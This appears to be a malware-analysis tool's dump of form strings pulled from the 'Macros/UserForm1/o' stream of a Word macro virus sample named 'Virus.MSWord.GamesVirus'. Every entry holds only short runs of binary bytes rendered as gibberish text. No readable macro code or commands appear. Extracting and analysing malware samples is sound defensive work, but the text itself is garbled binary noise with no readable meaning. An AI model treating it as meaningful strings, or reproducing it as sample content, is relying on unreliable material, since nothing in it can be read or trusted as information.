- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!(%)(.10$! -)08BA79A%)(AJI8BQSZiFs�h��*Ri BQ3Zq3ZiNsyUkq;Zah��h��a��YJ0}kY���ukI!Ji<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
INs����H��*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�<cqLc�<cyNs�Ek�3ZyNs�Fs�Ns�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8)JQ BQh��(BQ3Zq>s�W{�Fs�,cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 +Zq3Zq)Ja!JY4c�Ek�Eky<c�=kyNs�;Zq=kyO{�W{�H��Fs� BY;ZY_{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.108B8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!(618/9879A.1Q.18SZYJRa79Q8BISZY8BIJRQG{�`��=ky=ky4cq3Zq<cq^s�Mky������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QJAEk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8H��W{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�5k�Ek�>s�=ky^s�5ky<c�=k�O{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0 BI BI'9Q;Za3Zi)Ja3Zy=k�Fs�;ZYCZa
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QDci2Ri<cy<cq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)AUkqEkyNs�O{�Fs�DcqFs�Fs�`��Ns�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8B8%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!(%) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IJQ)JQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 @BA-)(AJI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
798798

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9q798
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BA610	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)0AJI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BI-)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
618AJI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\ca618
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JRQ$! $! '9q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 79Idcq	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 *Ry8B8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AJI-)(IJQ@BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 8BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JRQ8BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10AJI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $!($!(%)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 618JRY?9Y/9QTcaSZYBRa61Y61a8BQJRQ79ABRYP��_{�i��Ek�<c�_{�Ns�ε��sAO9(QJ(H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(H��Fs�=k�G{�>s�Mk�;Zqh��Fs�Vs�&1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!qO{�X��O{�3Zq)Ja;Zi1JY'9Q;ZY2Ra Ba;ZaCZY3ZaNs�3Za
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A)JQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BYMkq;ZqFs�Ek�_{�^sy=ky`��H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)0$!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q!J�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! 79A61A61A.1AJRY.1A@BQ9JY.1a61Y79I8BIAJaAJa8BY%)aW{�a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(W{�=)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��iN1(�ƚKZ�`��a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 /9qO{�P��@��_{�a��Ek�=k�<cy)JYDci$!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q;ZqO{�X��Ns�RRI���O{�O{�X��G{�4cy)Ja*Ra)JQ<ca3Zi,cyW{�(BQ'9IDci<ciNs�Eky4cqP��_{�O{�i��Fs�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q!J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?{�$! 

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) 610
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'9q%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0%)8618-)861A%)879A%)Q-)079A.10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! -)0%)0%)(61A8BI@BQ79QKZY?9QJRY.18JRY.1I61Y8BY9JY%)Y61a%)aW{�Ek�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! BR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)YO{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Byz��j��G{�a��G{�W{�G{�EkyEk�W{�'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�%)�h��3ZiEkyEky<cy=kyFs�Fs�a��_{�Ns�Fs�4c�Dcq)JY3Zi2Ri<cy(BY*RaEky;ZqFs�;Zq<cy4c�W{�j��W{�r��r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0%)0-)A79A61I-)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
79ALci
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(.10$! .1879A79Q8BISZYBRY@BQTci79Q79Q8BI79I8BY.1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)YP��i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,! ,! >1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
61(g{�q��9Jy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�:R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�j��a��P��IJI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)ANs�O{�`��X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)YX��2Ra:Ra;ZiEk�<cqFs�X��H��G{�W{�Vs�O{�=k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)JY2Ri2Ra2RY'9Q<ci)JaVs�3Zq)Ja3ZiEk�a��Y��a��`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)(61(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8$!A$!A79Y-)I$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1879A:RI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8.18%)0618-)8-)0.1A%)I79I8BI8BI79A8BA8BI.1I.1Q0BI61a%)a.1i%)ar��`��,! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��iHB tc0G9 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BR�KZ���Å��z�ӟ��Uk�O{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 i��X��X��BR�KZ�79Y&1INs�X��g{�z��o{����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0W{�Vs�W{�<cqDciEky3ZiDcy3Zq*Rq=kq4c�Ns�<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2RiDci+Zq)JQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A<ci
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I!JY=k�G{�G{�G{�G{�P��H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y#Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(%) 3Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8$!A61I.1A61Q61Q-)Q@B(G905)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9JQ.18Ukq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{a.s�798-)I8BIAJQ61A%)(79ABRQ61AJRa.1a.1i%)a%)Yi��3Zi*Ra4!(�纆sQ�{I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5)(���Uk�s�����������<cqX��i��P��i��H��Fs�O{�BR�Lc�8Bi79Yw{�.18Tci������KZ�Ns�^s�Eky_{�MkqO{�h��=ky;Zq4cq<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)AEk�;Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q<cqMky<cq3Zq2Ri BY'9Q3Zi;ZqDcyNs�O{�r��i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1a"R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
($! ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A%)A-)A-)I79Q%)Y.1Q>1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��iQJ /9A.1879A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!(0BIk��$!q$!8%)(#Zi-)A.189JQ.1A.1A798AJI8BY9JQ9JQ79a%)a%)a-)aEk�Ekya��X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��O902RiP��Ns�k�����c��X��a��Ns�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ByG{�X��P��<c�G{�a��BR�p��0BiBRyp��mki���X��3Zq_{�=k�<cyEk�`��<c�;ZyNs�Vs�_{�Ns�Vs�O{�MkqMk�4ci=ky3Zq^sy3Zi2Ri<ciCZa)Ja<cqEkyEk�Fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
798-)(	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y BY?98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I"Rq
-------------------------------------------------------------------------------
